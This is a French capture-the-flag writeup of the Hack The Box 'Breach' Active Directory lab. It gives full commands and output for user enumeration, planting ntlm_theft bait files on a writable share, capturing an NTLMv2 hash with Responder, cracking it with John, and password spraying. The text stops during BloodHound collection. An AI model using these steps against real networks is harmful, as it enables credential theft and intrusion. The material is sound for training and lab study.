---
title: Breach
date: 2025-09-10
tags:
  - hackthebox
  - writeups
  - medium
  - windows
  - kerberoasting
  - SeImpersonatePrivilege
  - mssql
---

**Bienvenue dans ce writeup détaillé du labo "Breach" de VulnLab, disponible sur Hack The Box.** Dans ce guide, je vais te montrer comment j’ai réussi à compromettre un environnement Active Directory en enchaînant plusieurs techniques d’attaque réalistes. L’objectif ? Passer d’un simple accès SMB anonyme à un contrôle total du domaine, en exploitant des failles courantes dans les infrastructures Windows.

Au programme :

- **L’énumération des comptes invités** et la récupération de hachages NTLM via de l’ingénierie sociale.
- **Le Kerberoasting** pour cibler les comptes de service vulnérables.
- **La génération de silver tickets** pour escalader les privilèges.
- **L’exploitation de MSSQL** et l’usurpation de jetons (_token impersonation_) pour obtenir un accès SYSTEM.

Ce writeup met en lumière des **vecteurs d’attaque concrets** que j’ai rencontrés, ainsi que les **mauvaises configurations** souvent négligées dans les environnements Active Directory.

# Recon
```
rustscan -a 10.129.14.15 -- -sCV -Pn

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-14 17:19:11Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-12-14T17:20:43+00:00; +53s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-14T17:14:57
| Not valid after:  2055-12-14T17:14:57
| MD5:   d9de34874b7eceebddcd22cc5493175b
| SHA-1: eb151cfdf4afd433fdc6793e52798a2bde19ae0d
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQHCQoXyuhX4xCUtfO6ZjWuzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMjE0MTcxNDU3WhgPMjA1NTEyMTQxNzE0NTdaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOgxOjgN
| wG4EG1K4nQgLyfuyOzaHb3STBJ+FuMZ5GwbIRmzI5ytgC4qrNn/hZK4Y2cF0P4k/
| WaZ4sxG4fycjZIIPkEuiugUSntdp2mmr9S/8d762tDSD2xaZs6gV0xDkx3tmVvQF
| ms0ftju9LNt7n4B3WInNHub4d+bjqSN4dDeDfTLBiV72xzHJAafmW+gIA5n43VPU
| 09XoaBRboWiHVyQ/hd8r30QZd5qL/T6rWabjzfnavicgObGHPTmXg6HpSE8yRqCY
| ZPyW5wXb50QSGNVR5sT2PgX69u/wQoKaJ9QrTRAaspOchub1AUYun+duopGyUPzS
| OcQIdBmpTNeY+x0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAAiHiGRjQ2agb3bE5
| hC4phoC4m18zatffc4giAV9X/BERefZHYMaPefRnc/j5S+VlBfDfet9xcvfJjkz1
| JyFoqINPF2SM0vCNRykR0JagmS9/YovOygasqd34XyRrCuyEB1vrCzIxppHjuGI/
| XSWNTLcH5s8YzN2njZmjlSRtqV4zA5BdtO9fpstx5HQ6rw0oByjkI0SPB3wJumpo
| ElXizIGaRYfWpcTiIFNPKlIhJzu19ih1Jc/EbjI0O/jBxeTU4ozjnPiJopbegn8w
| kRUq7Q1jATa+smdssp52SYrrokkdmADAb7H7wTasUzifWCC0CsK2cgAt+Xx/887y
| pOshIg==
|_-----END CERTIFICATE-----
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-14T17:20:04+00:00
|_ssl-date: 2025-12-14T17:20:43+00:00; +54s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-07T08:04:48
| Not valid after:  2026-03-09T08:04:48
| MD5:   f45754f6007310baecb20f99fca9d035
| SHA-1: ccc99cbf517171cb42e14951243ce58ca229cd36
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQG2ZJBuyGl6BOPrQhGij+hzANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwHhcNMjUwOTA3MDgwNDQ4WhcN
| MjYwMzA5MDgwNDQ4WjAdMRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDr0Po1BNi/Rf86RA49UWp30Roe
| cyMjyHDf8rw7jXP1e2r8EjqlTnsqF1jXTDF15O4XnKxXDZgbfA5HMJeKqEgiX6pU
| jCvPx7DltCjIZpeBsNXQ7VWMcufI2tkkxW9nMYl2tUAYlWUZ0vbtt9qcXlx5kTmD
| toYzUreg6H4dE3CvaqciqKv1jdfeGHJi4osmXfReKQm0kXQFQcznvI+sjZjW4nVd
| fXESwYUJW5AmD7/fsMCWiP1+QD13t3yiQmudfJfGWxvao6/QPyTQy8ReZqYhIowh
| Sipq3ANfBTnMDJ28LhAO7fjUIs32BGQ1b9vlPOLNFnxetwcDmwpgvEfCQomlAgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAYxOQcP3pJC3UXcEgZON8YNGZyX1sAXQyx3USwdxUfNvGmRNG
| yUqzZZG4kfOwJ1UDOVsPP4jhVVK2W+6V7VP2InCse+8FBBg/JlbYhrUA/wXChSqT
| 4BlswCYPTCk5kxMfrS7yjLGDcsWC18gWoFUur5LNMIR8HpS9RnRgQB1DcoTAXpeL
| bY/gBEmgovd+Oc9AYS7TnUIKmfm9N5J4fyJkbrY/him706SVR7uSNxFOd4JCc8dt
| Yv+1uiByI7ypUay4F67yceFC+1QhYsP4DONBQu/lcDhRgSJX0/DRUbNq8ilXGD0j
| VcqqM+HRpdHucUitpvX1KojPvNQaCIFmE/cZww==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49913/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52108/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64804/tcp): CLEAN (Timeout)
|   Check 2 (port 3762/tcp): CLEAN (Timeout)
|   Check 3 (port 29080/udp): CLEAN (Timeout)
|   Check 4 (port 47905/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-12-14T17:20:05
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 53s, deviation: 0s, median: 53s
```

- Editons le fichier hosts avec `nxc`
```sh
nxc smb 10.129.14.15 --generate-hosts-file /etc/hosts
```

## HTTP-80
![](Breach.png)

- Le port 80 semble héberger un service IIS (Internet Information Services) sous Windows, mais ne propose pas de fonctionnalités intéressantes ou exploitables


## Compte Guest
- Enumeration des utilisateurs du domain grace au *RID Brute Forcing*
```sh
nxc smb breach.vl -u 'guest' -p '' --rid-brute
SMB         10.129.14.15    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.14.15    445    BREACHDC         [+] breach.vl\guest:
SMB         10.129.14.15    445    BREACHDC         498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         500: BREACH\Administrator (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         501: BREACH\Guest (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         502: BREACH\krbtgt (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         512: BREACH\Domain Admins (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         513: BREACH\Domain Users (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         514: BREACH\Domain Guests (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         515: BREACH\Domain Computers (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         516: BREACH\Domain Controllers (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         517: BREACH\Cert Publishers (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         518: BREACH\Schema Admins (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         519: BREACH\Enterprise Admins (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         520: BREACH\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         521: BREACH\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         522: BREACH\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         525: BREACH\Protected Users (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         526: BREACH\Key Admins (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         527: BREACH\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         553: BREACH\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         571: BREACH\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         572: BREACH\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         1000: BREACH\BREACHDC$ (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1101: BREACH\DnsAdmins (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         1102: BREACH\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         1103: BREACH\SQLServer2005SQLBrowserUser$BREACHDC (SidTypeAlias)
SMB         10.129.14.15    445    BREACHDC         1104: BREACH\staff (SidTypeGroup)
SMB         10.129.14.15    445    BREACHDC         1105: BREACH\Claire.Pope (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1106: BREACH\Julia.Wong (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1107: BREACH\Hilary.Reed (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1108: BREACH\Diana.Pope (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1109: BREACH\Jasmine.Price (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1110: BREACH\George.Williams (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1111: BREACH\Lawrence.Kaur (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1112: BREACH\Jasmine.Slater (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1113: BREACH\Hugh.Watts (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1114: BREACH\Christine.Bruce (SidTypeUser)
SMB         10.129.14.15    445    BREACHDC         1115: BREACH\svc_mssql (SidTypeUser)
```

- Enumeration des utilisateurs valide du domain avec [kerbrute](https://github.com/ropnop/kerbrute) comme nous avons accès au port kerberos(88)
```sh
kerbrute userenum --dc breach.vl -d breach.vl users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 12/13/25 - Ronnie Flathers @ropnop

2025/12/13 18:27:21 >  Using KDC(s):
2025/12/13 18:27:21 >   breach.vl:88

2025/12/13 18:27:21 >  [+] VALID USERNAME:       BREACHDC$@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Claire.Pope@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Jasmine.Price@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Julia.Wong@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Diana.Pope@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Hilary.Reed@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Administrator@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Guest@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       George.Williams@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       svc_mssql@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Lawrence.Kaur@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Jasmine.Slater@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Christine.Bruce@breach.vl
2025/12/13 18:27:21 >  [+] VALID USERNAME:       Hugh.Watts@breach.vl
```
- Fichier ulisateurs `users.txt`
```
Administrator
Guest
Claire.Pope
Julia.Wong
Hilary.Reed
BREACHDC$
Diana.Pope
Jasmine.Price
Lawrence.Kaur
George.Williams
Jasmine.Slater
Hugh.Watts
svc_mssql
Christine.Bruce
```


### SMB shares avec guest 
```sh
nxc smb breach.vl -u guest -p '' -M spider_plus
SMB         10.129.14.15    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.14.15    445    BREACHDC         [+] breach.vl\guest:
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.14.15    445    BREACHDC         [*] Enumerated shares
SMB         10.129.14.15    445    BREACHDC         Share           Permissions     Remark
SMB         10.129.14.15    445    BREACHDC         -----           -----------     ------
SMB         10.129.14.15    445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.14.15    445    BREACHDC         C$                              Default share
SMB         10.129.14.15    445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.14.15    445    BREACHDC         NETLOGON                        Logon server share
SMB         10.129.14.15    445    BREACHDC         share           READ,WRITE
SMB         10.129.14.15    445    BREACHDC         SYSVOL                          Logon server share
SMB         10.129.14.15    445    BREACHDC         Users           READ
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.14.15.json".
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, share, SYSVOL, Users)
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] SMB Readable Shares:  3 (IPC$, share, Users)
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] SMB Writable Shares:  1 (share)
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] Total folders found:  63
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] Total files found:    67
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] File size average:    27.75 KB
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] File size min:        3 B
SPIDER_PLUS 10.129.14.15    445    BREACHDC         [*] File size max:        512 KB"
```

- Grâce à notre accès en écriture sur le partage `share`, une piste d’exploitation consiste à y déposer des fichiers malveillants dans le cadre d’une campagne d’ingénierie sociale. Par exemple, un fichier `.lnk` malicieux, un document Office piégé (macro, exploit), ou un exécutable camouflé en fichier légitime pourrait inciter un utilisateur à l’ouvrir, permettant ainsi d’obtenir une exécution de code arbitraire sur la machine cible.

- Nous allons utiliser [ntlm_theft](https://github.com/Greenwolf/ntlm_theft). Cet outil permet de générer des fichiers malveillants (comme des raccourcis `.lnk`, des documents Office ou des fichiers `.scf`) conçus pour déclencher une authentification NTLM automatique lorsque la victime les ouvre.

```sh
ntlm_theft.py --verbose --generate all --server "10.10.14.142" --filename "/workspace/Breach/getHash"
Created: /workspace/Breach/getHash.scf (BROWSE TO FOLDER)
Created: /workspace/Breach/getHash-(url).url (BROWSE TO FOLDER)
Created: /workspace/Breach/getHash-(icon).url (BROWSE TO FOLDER)
Created: /workspace/Breach/getHash.lnk (BROWSE TO FOLDER)
Created: /workspace/Breach/getHash.rtf (OPEN)
Created: /workspace/Breach/getHash-(stylesheet).xml (OPEN)
Created: /workspace/Breach/getHash-(fulldocx).xml (OPEN)
Created: /workspace/Breach/getHash.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: /workspace/Breach/getHash-(includepicture).docx (OPEN)
Created: /workspace/Breach/getHash-(remotetemplate).docx (OPEN)
Created: /workspace/Breach/getHash-(frameset).docx (OPEN)
Created: /workspace/Breach/getHash-(externalcell).xlsx (OPEN)
Created: /workspace/Breach/getHash.wax (OPEN)
Created: /workspace/Breach/getHash.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: /workspace/Breach/getHash.asx (OPEN)
Created: /workspace/Breach/getHash.jnlp (OPEN)
Created: /workspace/Breach/getHash.application (DOWNLOAD AND OPEN)
Created: /workspace/Breach/getHash.pdf (OPEN AND ALLOW)
Created: /workspace/Breach/getHash/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: /workspace/Breach/getHash/Autorun.inf (BROWSE TO FOLDER)
Created: /workspace/Breach/getHash/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```
- Vous pouvez simplement uploader tous les fichiers générés par `ntlm_theft` dans le partage `transfer`. Dans ce cas, l’extension `.lnk` fonctionne particulièrement bien.
```sh
smb: \transfer\> mput getHash.*
putting file getHash.pdf as \transfer\getHash.pdf (1.7 kb/s) (average 1.8 kb/s)
putting file getHash.application as \transfer\getHash.application (3.8 kb/s) (average 2.0 kb/s)
putting file getHash.jnlp as \transfer\getHash.jnlp (0.5 kb/s) (average 1.9 kb/s)
putting file getHash.asx as \transfer\getHash.asx (0.4 kb/s) (average 1.8 kb/s)
putting file getHash.m3u as \transfer\getHash.m3u (0.1 kb/s) (average 1.7 kb/s)
putting file getHash.wax as \transfer\getHash.wax (0.1 kb/s) (average 1.6 kb/s)
putting file getHash.htm as \transfer\getHash.htm (0.2 kb/s) (average 1.5 kb/s)
putting file getHash.rtf as \transfer\getHash.rtf (0.3 kb/s) (average 1.5 kb/s)
putting file getHash.lnk as \transfer\getHash.lnk (4.0 kb/s) (average 1.6 kb/s)
putting file getHash.scf as \transfer\getHash.scf (0.2 kb/s) (average 1.6 kb/s)
```

- Lancez ensuite Responder sur l’interface de votre tunnel (ex. : `tun0` ou `eth0`) pour intercepter les requêtes NTLM et récupérer les hashs :
```sh
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[*] Sponsor Responder: https://paypal.me/PythonResponder

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.142]
    Responder IPv6             [dead:beef:2::108c]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZRQVYWTU9YY]
    Responder Domain Name      [6UPQ.LOCAL]
    Responder DCE-RPC Port     [45043]

[*] Version: Responder 3.1.6.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.14.15
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:1122334455667788:CB0970E16ABB54736068DDF699F4017A:0101000000000000800EA77D616CDC01C1E5B397105049020000000002000800360055005000510001001E00570049004E002D005A00520051005600590057005400550039005900590004003400570049004E002D005A0052005100560059005700540055003900590059002E0036005500500051002E004C004F00430041004C000300140036005500500051002E004C004F00430041004C000500140036005500500051002E004C004F00430041004C0007000800800EA77D616CDC0106000400020000000800300030000000000000000100000000200000C8ECF0DFB011D5526FE056504E253AEAE480593A872E6E68AF8DCE6EDDA6D84E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100340032000000000000000000
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
```

- Une fois les hashs NTLM capturés par Responder, enregistrez-les dans un fichier (par exemple `hashes.txt`). Vous pouvez ensuite utiliser **John the Ripper** avec la wordlist `rockyou.txt` pour tenter de les casser :
```sh
nvim hash.txt
root@exegol-htb /workspace/Breach
john --wordlist=`fzf-wordlists` hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Computer1        (Julia.Wong)
1g 0:00:00:00 DONE (2025-12-13 19:02) 6.667g/s 805546p/s 805546c/s 805546C/s bratpack..042579
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Julia.Wong
Nous avons les identifiants de `Julia.Wong` 
```sh
nxc smb breach.vl -u users.txt -p Computer1 --continue-on-success
SMB         10.129.14.15    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Administrator:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Guest:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Claire.Pope:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [+] breach.vl\Julia.Wong:Computer1
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Hilary.Reed:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\BREACHDC$:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Diana.Pope:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Jasmine.Price:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Lawrence.Kaur:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\George.Williams:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Jasmine.Slater:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Hugh.Watts:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\svc_mssql:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.15    445    BREACHDC         [-] breach.vl\Christine.Bruce:Computer1 STATUS_LOGON_FAILURE
```

- Enumeration des droits en ecriture de Julia.Wong avec [bloodyAD](https://github.com/CravateRouge/bloodyAD)
 ```sh
bloodyAD -d breach.vl -u Julia.Wong -p Computer1 --host breach.vl get writable

distinguishedName: CN=Users,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=Computers,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=breach,DC=vl
permission: WRITE

distinguishedName: CN=BREACHDC,OU=Domain Controllers,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: OU=staff,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=Julia Wong,OU=staff,DC=breach,DC=vl
permission: WRITE
 ```
 
- Collecte des informations de l'Active Directory pour alimenter [BloodHound-ce](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) avec [RustHound](https://github.com/NH-RED-TEAM/RustHound)
```sh
rusthound -d breach.vl -u Julia.Wong -p Computer1
---------------------------------------------------
Initializing RustHound at 19:05:20 on 12/13/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-12-13T19:05:20Z INFO  rusthound] Verbosity level: Info
[2025-12-13T19:05:20Z INFO  rusthound::ldap] Connected to BREACH.VL Active Directory!
[2025-12-13T19:05:20Z INFO  rusthound::ldap] Starting data collection...
[2025-12-13T19:05:21Z INFO  rusthound::ldap] All data collected for NamingContext DC=breach,DC=vl
[2025-12-13T19:05:21Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-12-13T19:05:21Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-12-13T19:05:21Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-12-13T19:05:21Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-12-13T19:05:21Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 15 users parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_users.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_groups.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_computers.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 2 ous parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_ous.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_domains.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213190521_breach-vl_gpos.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 21 containers parsed!
